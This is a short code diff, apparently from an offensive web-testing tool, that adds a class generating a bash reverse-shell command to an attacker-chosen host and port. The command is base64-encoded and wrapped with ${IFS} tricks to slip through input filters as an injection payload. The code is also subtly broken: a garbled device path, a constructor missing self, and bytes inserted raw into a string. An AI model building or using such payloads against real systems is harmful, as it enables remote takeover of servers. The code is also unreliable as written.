@@ -2,6 +2,23 @@ import re
 from bs4 import BeautifulSoup
 import requests
 import json
+import base64
+
+class Generator:
+    def __init__():
+        pass
+
+    def shell(self, lhost, lport, s='bash'):
+        sh = f'{s} -i >& /dev_tcp/{lhost}/{lport} 0>&1'
+
+        sh_enc = base64.b64encode(sh.encode('utf-8'))
+
+        wrapped = f'echo${{IFS}}{sh_enc}|base64${{IFS}}-d|{s}'
+
+        return wrapped
+
+    def bin(self):
+        pass
 
 class Monkey:
     forms = []
